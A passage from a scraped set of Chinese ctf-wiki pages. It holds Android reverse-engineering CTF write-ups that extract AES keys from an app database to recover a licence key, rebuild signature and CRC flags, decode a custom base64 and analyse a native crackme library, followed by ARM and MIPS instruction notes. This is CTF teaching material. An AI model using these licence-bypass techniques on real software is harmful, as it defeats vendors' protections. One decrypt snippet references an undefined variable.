MainActivity.OK_LICENCE_MSG);\n                    return;\n                }\n                MainActivity.this.showAlertDialog(context, MainActivity.NOK_LICENCE_MSG);\n            }\n        }).setNegativeButton(\"Cancel\", new C00855());\n        builder.create().show();\n    }\n```\n\n我们发现，其实 MainActivity.NOK_LICENCE_MSG就存储着报错的字符串信息，再继续读一下发现程序使用\n\n```java\nKeyVerifier.isValidLicenceKey(editText.getText().toString(), MainActivity.this.app.getDataHelper().getConfig().getSecurityKey(), MainActivity.this.app.getDataHelper().getConfig().getSecurityIv())\n```\n\n来进行验证，如果验证通过就会跳出成功信息。\n\n### 详细分析\n\n进而我们仔细分析一下这三个参数。\n\n#### 参数1\n\n参数1其实就是我们输入的字符串。\n\n#### 参数2\n\n是利用函数来获取getSecurityKey，我们简单阅读一下，可以发现程序在getConfig函数中设置了SecurityKey\n\n```java\n    public AppConfig getConfig() {\n        boolean z = false;\n        AppConfig appConfig = new AppConfig();\n        Cursor rawQuery = this.myDataBase.rawQuery(SELECT_QUERY, null);\n        if (rawQuery.moveToFirst()) {\n            appConfig.setId(rawQuery.getInt(0));\n            appConfig.setName(rawQuery.getString(1));\n            appConfig.setInstallDate(rawQuery.getString(2));\n            if (rawQuery.getInt(3) > 0) {\n                z = true;\n            }\n            appConfig.setValidLicence(z);\n            appConfig.setSecurityIv(rawQuery.getString(4));\n            appConfig.setSecurityKey(rawQuery.getString(5));\n            appConfig.setDesc(rawQuery.getString(7));\n        }\n        return appConfig;\n    }\n```\n\n其中，函数首先进行了数据库访问，SELECT_QUERY如下\n\n```java\n    private static String DB_NAME = \"db.db\";\n    private static String DB_PATH = \"/data/data/edu.sharif.ctf/databases/\";\n    public static final String SELECT_QUERY = (\"SELECT  * FROM \" + TABLE_NAME + \" WHERE a=1\");\n    private static String TABLE_NAME = \"config\";\n```\n\n同时，我们可以得到该数据库的路径。\n\n在进一步分析，我们可以发现程序在这里首先获取了表config的首行，然后将iv设置为第四列的值，key设置为第5列的值。\n\n```java\n            appConfig.setSecurityIv(rawQuery.getString(4));\n            appConfig.setSecurityKey(rawQuery.getString(5));\n```\n\n#### 参数3\n\n其实，参数3类似于参数2。这里就不做说明了。\n\n### 获取数据库文件\n\n首先，我们需要将该apk文件装到手机上，然后利用如下指令获取\n\n```shell\nadb pull /data/data/edu.sharif.ctf/databases/db.db\n```\n\n进而使用电脑上可以查看sqlite的软件查看一下，这里我使用的是<u>http://sqlitebrowser.org/</u>。如下\n\n![](./figure/2014-Sharif-db.png)\n\n这里，我们可以直接得到\n\n```text\nSecurityIv=a5efdbd57b84ca36\nSecurityKey=37eaae0141f1a3adf8a1dee655853714\n```\n\n### 分析加密代码\n\n```java\npublic class KeyVerifier {\n    public static final String CIPHER_ALGORITHM = \"AES/CBC/PKCS5Padding\";\n    public static final String VALID_LICENCE = \"29a002d9340fc4bd54492f327269f3e051619b889dc8da723e135ce486965d84\";\n\n    public static String bytesToHexString(byte[] bArr) {\n        StringBuilder stringBuilder = new StringBuilder();\n        int length = bArr.length;\n        for (int i = 0; i < length; i++) {\n            stringBuilder.append(String.format(\"%02x\", new Object[]{Integer.valueOf(bArr[i] & 255)}));\n        }\n        return stringBuilder.toString();\n    }\n\n    public static String encrypt(String str, String str2, String str3) {\n        String str4 = \"\";\n        try {\n            Key secretKeySpec = new SecretKeySpec(hexStringToBytes(str2), \"AES\");\n            Cipher instance = Cipher.getInstance(CIPHER_ALGORITHM);\n            instance.init(1, secretKeySpec, new IvParameterSpec(str3.getBytes()));\n            str4 = bytesToHexString(instance.doFinal(str.getBytes()));\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        return str4;\n    }\n\n    public static byte[] hexStringToBytes(String str) {\n        int length = str.length();\n        byte[] bArr = new byte[(length / 2)];\n        for (int i = 0; i < length; i += 2) {\n            bArr[i / 2] = (byte) ((Character.digit(str.charAt(i), 16) << 4) + Character.digit(str.charAt(i + 1), 16));\n        }\n        return bArr;\n    }\n\n    public static boolean isValidLicenceKey(String str, String str2, String str3) {\n        return encrypt(str, str2, str3).equals(VALID_LICENCE);\n    }\n}\n```\n\n可以看到程序首先使用了encrypt函数对三个字符串加密。其实就是利用上面所说的AES/CBC/PKCS5Padding方法加密，将str2作为key，将str3作为初始向量。那么我们可以很容易地添加解密函数如下\n\n```java\n\tpublic static String decrypt(String input, String secretKey, String iv) {\n\t\tString encryptedText = \"\";\n\t\ttry {\n\t\t\tSecretKeySpec secretKeySpec = new SecretKeySpec(hexStringToBytes(secretKey), \"AES\");\n\t\t\tCipher cipher = Cipher.getInstance(CIPHER_ALGORITHM);\n\t\t\tcipher.init(2, secretKeySpec, new IvParameterSpec(iv.getBytes()));\n\t\t\tencryptedText = bytesToHexString(cipher.doFinal(hexStringToBytes(userInput)));\n\t\t} catch (Exception e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t\treturn encryptedText;\n\t}\n```\n\n然后运行得到正常输入的product key\n\n```text\nfl-ag-IS-se-ri-al-NU-MB-ER\n```\n\n## 2015-0CTF-vezel\n\n### 分析\n\n首先，分析代码，如下\n\n```\npublic void confirm(View v) {\n    if(\"0CTF{\" + String.valueOf(this.getSig(this.getPackageName())) + this.getCrc() + \"}\".equals(\n            this.et.getText().toString())) {\n        Toast.makeText(((Context)this), \"Yes!\", 0).show();\n    }\n    else {\n        Toast.makeText(((Context)this), \"0ops!\", 0).show();\n    }\n}\n\nprivate String getCrc() {\n    String v1;\n    try {\n        v1 = String.valueOf(new ZipFile(this.getApplicationContext().getPackageCodePath()).getEntry(\n                \"classes.dex\").getCrc());\n    }\n    catch(Exception v0) {\n        v0.printStackTrace();\n    }\n\n    return v1;\n}\n\nprivate int getSig(String packageName) {\n    int v4;\n    PackageManager v2 = this.getPackageManager();\n    int v5 = 64;\n    try {\n        v4 = v2.getPackageInfo(packageName, v5).signatures[0].toCharsString().hashCode();\n    }\n    catch(Exception v0) {\n        v0.printStackTrace();\n    }\n\n    return v4;\n}\n```\n\n可以看出我们想要的flag的分为两个部分\n\n- String.valueOf(this.getSig(this.getPackageName()))\n- this.getCrc()\n\n其中第一部分，我们可以采用自己编写一个app来获取对应的值。第二部分我们可以直接将dex文件提取出来，利用网上的工具计算一下。\n\n### hashcode\n\n随便找了个（放在对应的example文件夹下）\n\n```\npackage com.iromise.getsignature;\n\nimport android.content.pm.PackageInfo;\nimport android.content.pm.PackageManager;\nimport android.content.pm.Signature;\nimport android.support.v7.app.AppCompatActivity;\nimport android.os.Bundle;\nimport android.text.TextUtils;\nimport android.util.Log;\nimport android.widget.Toast;\n\npublic class MainActivity extends AppCompatActivity {\n\n    private StringBuilder builder;\n\n    public void onCreate(Bundle savedInstanceState) {\n        super.onCreate(savedInstanceState);\n        setContentView(R.layout.activity_main);\n        PackageManager manager = getPackageManager();\n        builder = new StringBuilder();\n        String pkgname = \"com.ctf.vezel\";\n        boolean isEmpty = TextUtils.isEmpty(pkgname);\n        if (isEmpty) {\n            Toast.makeText(this, \"应用程序的包名不能为空！\", Toast.LENGTH_SHORT);\n        } else {\n            try {\n                PackageInfo packageInfo = manager.getPackageInfo(pkgname, PackageManager.GET_SIGNATURES);\n                Signature[] signatures = packageInfo.signatures;\n                Log.i(\"hashcode\", String.valueOf(signatures[0].toCharsString().hashCode()));\n            } catch (PackageManager.NameNotFoundException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n\n```\n\n然后再ddms中过滤出hashcode\n\n```\n07-18 11:05:11.895 16124-16124/? I/hashcode: -183971537\n```\n\n**注：其实这个程序可以写成一个小的app，很多程序都会计算签名。**\n\n### classes.dex crc32\n\n随便找个在线网站获取一下`classes.dex`的CRC32值。\n\n```text\nCRC-32\t46e26557\nMD5 Hash\t3217b0ad6c769233ea2a49d17885b5ba\nSHA1 Hash\tec3b4730654248a02b016d00c9ae2425379bf78f\nSHA256 Hash\t6fb1df4dacc95312ec72d8b79d22529e1720a573971f866bbf8963b01499ecf8\n```\n\n需要注意的是，这里需要转成十进制\n\n```\n>>> print int(\"46E26557\", 16)\n1189242199\n```\n\n### flag\n\n两部分算完合起来就是Flag\n\nFlag：0ctf{-1839715371189242199}\n\n## 2017 XMAN HelloSmali2\n\n给的是一个 smali 文件，我们可以按照如下思路来做\n\n利用 smali.jar 将 smali 汇编为 dex 文件。\n\n```shell\njava -jar smali.jar assemble  src.smali -o src.dex\n```\n\n使用 jadx 反编译 dex，如下\n\n```java\npackage com.example.hellosmali.hellosmali;\n\npublic class Digest {\n    public static boolean check(String input) {\n        String str = \"+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\";\n        if (input == null || input.length() == 0) {\n            return false;\n        }\n        int i;\n        char[] charinput = input.toCharArray();\n        StringBuilder v2 = new StringBuilder();\n        for (char toBinaryString : charinput) {\n            String intinput = Integer.toBinaryString(toBinaryString);\n            while (intinput.length() < 8) {\n                intinput = \"0\" + intinput;\n            }\n            v2.append(intinput);\n        }\n        while (v2.length() % 6 != 0) {\n            v2.append(\"0\");\n        }\n        String v1 = String.valueOf(v2);\n        char[] v4 = new char[(v1.length() / 6)];\n        for (i = 0; i < v4.length; i++) {\n            int v6 = Integer.parseInt(v1.substring(0, 6), 2);\n            v1 = v1.substring(6);\n            v4[i] = str.charAt(v6);\n        }\n        StringBuilder v3 = new StringBuilder(String.valueOf(v4));\n        if (input.length() % 3 == 1) {\n            v3.append(\"!?\");\n        } else if (input.length() % 3 == 2) {\n            v3.append(\"!\");\n        }\n        if (String.valueOf(v3).equals(\"xsZDluYYreJDyrpDpucZCo!?\")) {\n            return true;\n        }\n        return false;\n    }\n}\n```\n\n简单看一下，其实是一个变种的 base64 加密，我们可以在网上找一个 base64 编码，然后设置一下就好了，这里使用的脚本来自于 http://www.cnblogs.com/crazyrunning/p/7382693.html。\n\n```python\n#coding=utf8\nimport string\n\nbase64_charset = '+/abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'\n\n\n\n\ndef decode(base64_str):\n    \"\"\"\n    解码base64字符串\n    :param base64_str:base64字符串\n    :return:解码后的bytearray；若入参不是合法base64字符串，返回空bytearray\n    \"\"\"\n    # 对每一个base64字符取下标索引，并转换为6为二进制字符串\n    base64_bytes = ['{:0>6}'.format(str(bin(base64_charset.index(s))).replace('0b', '')) for s in base64_str if\n                    s != '=']\n    resp = bytearray()\n    nums = len(base64_bytes) // 4\n    remain = len(base64_bytes) % 4\n    integral_part = base64_bytes[0:4 * nums]\n\n    while integral_part:\n        # 取4个6位base64字符，作为3个字节\n        tmp_unit = ''.join(integral_part[0:4])\n        tmp_unit = [int(tmp_unit[x: x + 8], 2) for x in [0, 8, 16]]\n        for i in tmp_unit:\n            resp.append(i)\n        integral_part = integral_part[4:]\n\n    if remain:\n        remain_part = ''.join(base64_bytes[nums * 4:])\n        tmp_unit = [int(remain_part[i * 8:(i + 1) * 8], 2) for i in range(remain - 1)]\n        for i in tmp_unit:\n            resp.append(i)\n\n    return resp\n\nif __name__==\"__main__\":\n    print decode('A0NDlKJLv0hTA1lDAuZRgo==')\n```\n\n结果如下\n\n```shell\n➜  tmp python test.py\neM_5m4Li_i4_Ea5y\n```\n\n## 题目\n\n- GCTF 2017 Android1\n- GCTF 2017 Android2\n- ISG 2017 Crackme\n- XMAN 2017 mobile3 rev1\n", "timestamp": "2025-10-21T22:02:39.431525"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/android/basic_reverse/static/so-example.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/android/basic_reverse/static/so-example.md", "content": "# 静态分析原生层程序\n\n## 基本方法\n\n静态分析原生层程序基本的过程如下\n\n1. 提取 so 文件\n2. ida 反编译 so 文件阅读 so 代码\n3. 根据 java 层的代码来分析 so 代码。\n4. 根据 so 代码的逻辑辅助整个程序的分析。\n\n## 原生层静态分析例子\n\n### 2015-海峡两岸-一个APK，逆向试试吧\n\n#### 反编译\n\n利用jadx反编译apk，确定应用的主活动\n\n```xml\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<manifest xmlns:android=\"http://schemas.android.com/apk/res/android\" xmlns:app=\"http://schemas.android.com/apk/res-auto\" android:versionCode=\"1\" android:versionName=\"1.0\" package=\"com.example.mobicrackndk\">\n    <uses-sdk android:minSdkVersion=\"8\" android:targetSdkVersion=\"17\" />\n    <application android:theme=\"@style/AppTheme\" android:label=\"@string/app_name\" android:icon=\"@drawable/ic_launcher\" android:allowBackup=\"true\">\n        <activity android:label=\"@string/app_name\" android:name=\"com.example.mobicrackndk.CrackMe\">\n            <intent-filter>\n                <action android:name=\"android.intent.action.MAIN\" />\n                <category android:name=\"android.intent.category.LAUNCHER\" />\n            </intent-filter>\n        </activity>\n    </application>\n</manifest>\n```\n\n不难看出，程序的主活动为 com.example.mobicrackndk.CrackMe。\n\n#### 分析主活动\n\n不难看出，程序的基本情况就是利用 native 函数 testFlag 判断用户传入的 pwdEditText 是否满足要求。\n\n```java\npublic native boolean testFlag(String str);\n\nstatic {\n  System.loadLibrary(\"mobicrackNDK\");\n}\n\nprotected void onCreate(Bundle savedInstanceState) {\n  super.onCreate(savedInstanceState);\n  setContentView((int) R.layout.activity_crack_me);\n  this.inputButton = (Button) findViewById(R.id.input_button);\n  this.pwdEditText = (EditText) findViewById(R.id.pwd);\n  this.inputButton.setOnClickListener(new OnClickListener() {\n    public void onClick(View v) {\n      CrackMe.this.input = CrackMe.this.pwdEditText.getText().toString();\n      if (CrackMe.this.input == null) {\n        return;\n      }\n      if (CrackMe.this.testFlag(CrackMe.this.input)) {\n        Toast.makeText(CrackMe.this, CrackMe.this.input, 1).show();\n      } else {\n        Toast.makeText(CrackMe.this, \"Wrong flag\", 1).show();\n      }\n    }\n  });\n}\n```\n\n#### 分析so文件\n\n自然我们首先会去直接找 testFlag 函数，凡是并没有直接找到。我们只好首先分析 JNI_Onload 函数，如下\n\n```c\nsigned int __fastcall JNI_OnLoad(JNIEnv *a1)\n{\n  JNIEnv *v1; // r4\n  int v2; // r5\n  char *v3; // r7\n  int v4; // r1\n  const char *v5; // r1\n  int v7; // [sp+Ch] [bp-1Ch]\n\n  v1 = a1;\n  v7 = 0;\n  printf(\"JNI_OnLoad\");\n  if ( ((*v1)->FindClass)(v1, &v7, 65540) )\n    goto LABEL_7;\n  v2 = v7;\n  v3 = classPathName[0];\n  fprintf((&_sF + 168), \"RegisterNatives start for '%s'\", classPathName[0]);\n  v4 = (*(*v2 + 24))(v2, v3);\n  if ( !v4 )\n  {\n    v5 = \"Native registration unable to find class '%s'\";\nLABEL_6:\n    fprintf((&_sF + 168), v5, v3);\nLABEL_7:\n    fputs(\"GetEnv failed\", (&_sF + 168));\n    return -1;\n  }\n  if ( (*(*v2 + 860))(v2, v4, off_400C, 2) < 0 )\n  {\n    v5 = \"RegisterNatives failed for '%s'\";\n    goto LABEL_6;\n  }\n  return 65540;\n}\n```\n\n可以发现，程序在这里动态注册了类和相应的函数 off_400C。仔细看一下该函数\n\n```text\n.data:0000400C off_400C        DCD aTestflag           ; DATA XREF: JNI_OnLoad+68↑o\n.data:0000400C                                         ; .text:off_1258↑o\n.data:0000400C                                         ; \"testFlag\"\n.data:00004010                 DCD aLjavaLangStrin_0   ; \"(Ljava/lang/String;)Z\"\n.data:00004014                 DCD abcdefghijklmn+1\n.data:00004018                 DCD aHello              ; \"hello\"\n.data:0000401C                 DCD aLjavaLangStrin_1   ; \"()Ljava/lang/String;\"\n.data:00004020                 DCD native_hello+1\n.data:00004020 ; .data         ends\n```\n\n可以发现，确实就是 testflag 函数，其对应的函数名为 abcdefghijklmn。\n\n#### 分析abcdefghijklmn\n\n可以发现，程序主要在三个部分对输入的 v10 进行了判断\n\n- 判断1\n\n```c\n  if ( strlen(v10) == 16 )\n```\n\n说明输入的字符串长度为16。\n\n- 判断2\n\n```c\n    v3 = 0;\n    do\n    {\n      s2[v3] = v10[v3] - v3;\n      ++v3;\n    }\n    while ( v3 != 8 );\n    v2 = 0;\n    v12 = 0;\n    if ( !strcmp(seed[0], s2) )\n```\n\n- 判断3\n\n```c\n      v9 = ((*jniEnv)->FindClass)();\n      if ( !v9 )\n      {\n        v4 = \"class,failed\";\nLABEL_11:\n        _android_log_print(4, \"log\", v4);\n        exit(1);\n      }\n      v5 = ((*jniEnv)->GetStaticMethodID)();\n      if ( !v5 )\n      {\n        v4 = \"method,failed\";\n        goto LABEL_11;\n      }\n      _JNIEnv::CallStaticVoidMethod(jniEnv, v9, v5);\n      v6 = ((*v1)->GetStaticFieldID)(v1, v9, \"key\", \"Ljava/lang/String;\");\n      if ( !v6 )\n        _android_log_print(4, \"log\", \"fid,failed\");\n      ((*v1)->GetStaticObjectField)(v1, v9, v6);\n      v7 = ((*jniEnv)->GetStringUTFChars)();\n      while ( v3 < strlen(v7) + 8 )\n      {\n        v13[v3 - 8] = v10[v3] - v3;\n        ++v3;\n      }\n      v14 = 0;\n      v2 = strcmp(v7, v13) <= 0;\n```\n\n根据汇编代码，可知第三个判断中调用了calcKey类中的静态方法\n\n```asm\n.text:00001070                 LDR     R0, [R5]\n.text:00001072                 LDR     R2, =(aCalckey - 0x1080)\n.text:00001074                 LDR     R3, =(aV - 0x1084)\n.text:00001076                 LDR     R4, [R0]\n.text:00001078                 MOVS    R1, #0x1C4\n.text:0000107C                 ADD     R2, PC          ; \"calcKey\"\n.text:0000107E                 LDR     R4, [R4,R1]\n.text:00001080                 ADD     R3, PC          ; \"()V\"\n```\n\n并在之后获得了key的内容。\n\n```Java\n    public static String key;\n\n    public static void calcKey() {\n        key = new StringBuffer(\"c7^WVHZ,\").reverse().toString();\n    }\n}\n```\n\n#### 获取flag\n\n根据这三个判断，我们可以得到输入的字符串内容\n\n```python\ns = \"QflMn`fH,ZHVW^7c\"\nflag = \"\"\nfor idx,c in enumerate(s):\n    flag +=chr(ord(c)+idx)\nprint flag\n```\n\n结果如下\n\n```shell\nQgnPrelO4cRackEr\n```\n\n输入之后并不对。\n\n#### 再次分析\n\n想到这里就要考虑下，程序是不是在哪里修改了对应的字符串。这里首先看一下seed。对 x 进行交叉引用，发现其在 _init_my 中使用了，如下\n\n```c\nsize_t _init_my()\n{\n  size_t i; // r7\n  char *v1; // r4\n  size_t result; // r0\n\n  for ( i = 0; ; ++i )\n  {\n    v1 = seed[0];\n    result = strlen(seed[0]);\n    if ( i >= result )\n      break;\n    t[i] = v1[i] - 3;\n  }\n  seed[0] = t;\n  byte_4038 = 0;\n  return result;\n}\n```\n\n所以最初程序对 seed 进行了修改。\n\n#### 再次获取flag\n\n修改脚本如下\n\n```python\ns = \"QflMn`fH,ZHVW^7c\"\nflag = \"\"\nfor idx,c in enumerate(s):\n    tmp = ord(c)\n    if idx<8:\n        tmp-=3\n    flag +=chr(tmp+idx)\nprint flag\n```\n\nflag 如下\n\n```\n➜  2015-海峡两岸一个APK，逆向试试吧 python exp.py\nNdkMobiL4cRackEr\n```\n\n当然该题目也可以使用动态调试。\n\n\n\n", "timestamp": "2025-10-21T22:02:39.556837"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/assembly/arm/readme.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/assembly/arm/readme.md", "content": "# ARM\n\n介绍 arm 基础内容。\n\n\n\n## 1. arm汇编基础\n\n### 1. LDMIA R0 , {R1,R2,R3,R4}\n\nLDM为: 多寄存器“内存取”指令\nIA表示每次LDM指令结束之后R0增加1个字\n最终结果为R1 = [R0], R1 = [R0+#4], R1 = [R0+#8], R1 = [R0+#0xC]\n\n### 2. 堆栈寻址 (FA、EA、FD、ED)\n\nSTMFD SP! , {R1-R7,LR} @ 将R1~R7以及LR入栈\nLDMFD SP! , {R1-R7,LR} @ 将R1~R7以及LR出栈\n\n### 3. 块拷贝寻址\n\nLDM和STM为指令前缀，表示多寄存器寻址，指令后缀(IA、DA、IB、DB)。\nLDMIA R0!, {R1-R3} @从R0所指向的内存地址依次取出3个字到R1、R2、R3寄存器\nSTMIA R0!, {R1-R3} @将R1、R2、R3所存储的内容依次存放在R0所指向的内存。\n\n### 4. 相对寻址\n\n```\n以当前程序计数器PC的当前值为基地址，将标号标记位置为偏移量，两者相加得\n到有效地址。\n\n\nBL NEXT\n    ...        \nNEXT:\n    ...\n```\n\n## 2. 指令集\n\n### 1. 由于arm芯片更新很快，所以指令集很多，使用较为普遍的就是arm指令集以及Thumb指令集。\n\n\n\n### 2.跳转指令\n\narm实现了两种跳转类型，一种是直接使用跳转指令，另外一种则是给PC寄存器直接赋值。\n\n#### 1. B跳转指令\n\n```\n结构 B{cond} label    \n直接跳走，如`BNE LABEL`\n```\n\n#### 2. BL跳转指令\n\n```\n结构 BL{cond} label    \n执行BL指令时，若条件满足，则首先将当前指令的下一条指令的地址赋值给R14寄存器(LR)，然\n后跳转到label标记的地址处继续执行。一般用在过程调用中，过程结束之后通过`MOV PC, LR`返回\n```\n\n#### 3. BX带状态切换的跳转指令\n\n```\n结构 BX{cond}Rm   \n当执行BX指令时，如果条件满足，会判断Rm寄存器的位[0]是否为1，如果是1则会在跳转时自动将CPSR寄存器的T标志位置为1,并将目标位置处的指令解析为Thumb指令，相反，若Rm寄存器的位[0]为0，则将CPSR寄存器的T标志位复位，同时将目标位置的指令解析为arm指令。\n```\n\n如下:\n\n```\nADR R0, thumbcode + 1\nBX R0       @跳转到thumbcode。并且处理器运行为thumb模式\nthumbcode:\n.code 16\n```\n\n\n\n#### 4.BLX带链接和状态切换的跳转指令\n\n```\n结构 BLX{cond}Rm\nBLX指令集合了BL和BX的功能，在BX的功能上同时保存返回地址到R14(LR)\n```\n\n### 3.寄存器访问指令\n\n存储器访问指令操作包括从存储区加载数据，存储数据到存储器，寄存器与存储器之间的数据交换等。\n\n#### `LDR`\n\n将内存中的数据放入到寄存器中\n\n指令示例：\n\n```\nLDRH R0，[R1]         ；将存储器地址为R1的半字数据读入寄存器R0，并将R0的高16位清零。\nLDRH R0，[R1，＃8]    ；将存储器地址为R1＋8的半字数据读入寄存器R0，并将R0的高16位清零。\nLDRH R0，[R1，R2]    ；将存储器地址为R1＋R2的半字数据读入寄存器R0，并将R0的高16位清零。\n```\n\n\n#### `STR`\n\nSTR用于存储数据到制定地址。格式如下：\nSTR{type}{cond}Rd,label\nSTRD{cond}Rd,Rd2,label\n用法如下:\n`STR R0,[R2,#04]` 将R0的值存储到R2+4的地址处\n\n#### `LDM`\n\n```\nLDM{addr_mode}{cond}Rn{!}reglist\n```\n\n该指令是将内存中堆栈内的数据，批量的赋值给寄存器，即是出栈操作。\n\n> 特别注意, ! 为可选后缀。如果有 ! 则最终地址会写回到Rn寄存器\n\n#### `STM`\n\nSTM将一个寄存器列表的数据存储到指定的地址单元中。格式如下\n\n```\nSTM{addr_mod}{cond}Rn{!}reglist\n```\n\n#### `PUSH&&POP`\n\n格式如下：\nPUSH{cond}reglist\nPOP{cond}reglist\n栈操作指令\n\n```\nPUSH {r0,r4-r7}\nPOP {r0,r4-r7}\n```\n\n\n\n#### `SWP`\n\n### 寄存器之间的数据交换。\n\n格式为`SWP{B}{cond}Rd,Rm,[Rn]`\nB是可选的字节，若有B，则交换字节，否则交换字\nRd为临时存放的寄存器，Rm是`要替换`的值\nRn是`要被替换`的数据地址\n\n### 参考链接\n\n[arm 指令学习](https://ring3.xyz/2017/03/05/[%E9%80%86%E5%90%91%E7%AF%87]arm%E6%8C%87%E4%BB%A4%E5%AD%A6%E4%B9%A0/)\n\n[常用arm指令](http://www.51-arm.com/upload/ARM_%E6%8C%87%E4%BB%A4.pdf)\n\n[arm-opcode-map](http://imrannazar.com/ARM-Opcode-Map)\n\n", "timestamp": "2025-10-21T22:02:40.091003"}
{"source": "github", "repo": "ctf-wiki/ctf-wiki", "file": "docs/zh/docs/assembly/mips/readme.md", "url": "https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/zh/docs/assembly/mips/readme.md", "content": "# MIPS\n\n## MIPS 基础内容\n\n这里以 MIPS32 为基础作为介绍内容。\n\n## 0x01 寄存器\n\n###  （1）通用寄存器\n\nMIPS 有 32 个通用寄存器 （General purpose registers），以美元符号 （`$`） 表示。可以表示为 `$0~$31`，也可以用寄存器名称表示如，`$sp` 、 `$t9` 、`$fp` 等等。\n\n| Register Number | Conventional Name | Usage                                                  | Usage                                                     |\n| --------------- | ----------------- | ------------------------------------------------------ | --------------------------------------------------------- |\n| $0              | $zero             | Hard-wired to 0                                        |                                                           |\n| $1              | $at               | Reserved for pseudo-instructions                       |                                                           |\n| $2 - $3         | $v0, $v1          | Return values from functions                           | 保存表达式或者函数返回值                                  |\n| $4 - $7         | $a0 - $a3         | Arguments to functions - not preserved by subprograms  | 函数的参数                                                |\n| $8 - $15        | $t0 - $t7         | Temporary data, not preserved by subprograms           |                                                           |\n| $16 - $23       | $s0 - $s7         | Saved registers, preserved by subprograms              |                                                           |\n| $24 - $25       | $t8 - $t9         | More temporary registers, not preserved by subprograms | 临时寄存器，作为 $t0 - $t7 的补充，$t9 通常与调用函数有关 |\n| $26 - $27       | $k0 - $k1         | Reserved for kernel. Do not use.                       |                                                           |\n| $28             | $gp               | Global Area Pointer (base of global data segment)      |                                                           |\n\n\n\nMIPS 作为一种 load-store 架构，意味着当我们要访问内存必须要通过加载和存储指令才能访问。所有其他指令（add，sub，mul，div等等）必须从寄存器获取其操作数并将其结果存储在寄存器中。例如下面的例子：\n\n```\n    sum = x + y\n```\n\n我们假设 sum 和 x , y 是程序中的变量，其 MIPS 汇编表示为：\n\n```\n    # sum = x + y\n    lw      $t0, x          # Load x from memory into a CPU register\n    lw      $t1, y          # Load y from memory into a CPU register\n    add     $t0, $t0, $t1   # Add x and y\n    sw      $t0, sum        # Store the result from the CPU register to memory\n```\n\n\n\n### （2）特殊寄存器\n\nMIPS32 架构还定义了3个特殊寄存器，分别是 PC（程序计数器）、HI （乘除结果高位寄存器）和 LO （乘除结果低位寄存器）。在进行乘运算的时候，HI 和 LO 保存乘法的结果，其中 HI 保存高32位，LO 保存低32位。而在除法运算中，HI 保存余数，LO 保存商。\n\n##  0x2 指令 Instruction\n\n\n\n**ADD – Add (with overflow)**\n\n| Description: | Adds two registers and stores the result in a register |\n| ------------ | ------------------------------------------------------ |\n| Operation:   | $d = $s + $t; advance_pc (4);                          |\n| Syntax:      | add $d, $s, $t                                         |\n| Encoding:    | `0000 00ss ssst tttt dddd d000 0010 0000`              |\n\n**ADDI -- Add immediate (with overflow)**\n\n| Description: | Adds a register and a sign-extended immediate value and stores the result in a register |\n| ------------ | ------------------------------------------------------------ |\n| Operation:   | $t = $s + imm; advance_pc (4);                               |\n| Syntax:      | addi $t, $s, imm                                             |\n| Encoding:    | `0010 00ss ssst tttt iiii iiii iiii iiii`                    |\n\n**ADDIU -- Add immediate unsigned (no overflow)**\n\n| Description: | Adds a register and a sign-extended immediate value and stores the result in a register |\n| ------------ | ------------------------------------------------------------ |\n| Operation:   | $t = $s + imm; advance_pc (4);                               |\n| Syntax:      | addiu $t, $s, imm                                            |\n| Encoding:    | `0010 01ss ssst tttt iiii iiii iiii iiii`                    |\n\n**ADDU -- Add unsigned (no overflow)**\n\n| Description: | Adds two registers and stores the result in a register |\n| ------------ | ------------------------------------------------------ |\n| Operation:   | $d = $s + $t; advance_pc (4);                          |\n| Syntax:      | addu $d, $s, $t                                        |\n| Encoding:    | `0000 00ss ssst tttt dddd d000 0010 0001`              |\n\n**AND -- Bitwise and**\n\n| Description: | Bitwise ands two registers and stores the result in a register |\n| ------------ | ------------------------------------------------------------ |\n| Operation:   | $d = $s & $t; advance_pc (4);                                |\n| Syntax:      | and $d, $s, $t                                               |\n| Encoding:    | `0000 00ss ssst tttt dddd d000 0010 0100`                    |\n\n**ANDI -- Bitwise and immediate**\n\n| Description: | Bitwise ands a register and an immediate value and stores the result in a register |\n| ------------ | ------------------------------------------------------------ |\n| Operation:   | $t = $s & imm; advance_pc (4);                               |\n| Syntax:      | andi $t, $s, imm                                             |\n| Encoding:    | `0011 00ss ssst tttt iiii iiii iiii iiii`                    |\n\n**BEQ -- Branch on equal**\n\n| Description: | Branches if the two registers are equal                     |\n| ------------ | ----------------------------------------------------------- |\n| Operation:   | if $s == $t advance_pc (offset << 2)); else advance_pc (4); |\n| Syntax:      | beq $s, $t, offset                                          |\n| Encoding:    | `0001 00ss ssst tttt iiii iiii iiii iiii`                   |\n\n**BGEZ -- Branch on greater than or equal to zero**\n\n| Description: | Branches if the register is greater than or equal to zero  |\n| ------------ | ---------------------------------------------------------- |\n| Operation:   | if $s >= 0 advance_pc (offset << 2)); else advance_pc (4); |\n| Syntax:      | bgez $s, offset                                            |\n| Encoding:    | `0000 01ss sss0 0001 iiii iiii iiii iiii`                  |\n\n**BGEZAL -- Branch on greater than or equal to zero and link**\n\n| Description: | Branches if the register is greater than or equal to zero and saves the return address in $31 |\n| ------------ | ------------------------------------------------------------ |\n| Operation:   | if $s >= 0 $31 = PC + 8 (or nPC + 4); advance_pc (offset << 2)); else advance_pc (4); |\n| Syntax:      | bgezal $s, offset                                            |\n| Encoding:    | `0000 01ss sss1 0001 iiii iiii iiii iiii`                    |\n\n**BGTZ -- Branch on greater than zero**\n\n| Description: | Branches if the register is greater than zero             |\n| ------------ | --------------------------------------------------------- |\n| Operation:   | if $s > 0 advance_pc (offset << 2)); else advance_pc (4); |\n| Syntax:      | bgtz $s, offset                                           |\n| Encoding:    | `0001 11ss sss0 0000 iiii iiii iiii iiii`                 |\n\n**BLEZ -- Branch on less than or equal to zero**\n\n| Description: | Branches if the register is less than or equal to zero     |\n| ------------ | ---------------------------------------------------------- |\n| Operation:   | if $s <= 0 advance_pc (offset << 2)); else advance_pc 